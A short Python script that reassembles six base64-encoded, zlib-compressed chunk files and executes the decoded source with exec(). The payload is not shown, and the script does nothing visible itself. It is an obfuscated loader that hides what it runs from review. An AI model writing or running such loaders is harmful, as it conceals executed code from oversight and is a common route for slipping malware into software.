from pathlib import Path
import zlib,base64
payload=''.join((Path('tools/v910_payload')/f'chunk_{i:02d}.txt').read_text() for i in range(6))
src=zlib.decompress(base64.b64decode(payload)).decode('utf-8')
exec(compile(src,'v910_apply.py','exec'))
# payload chunks installed
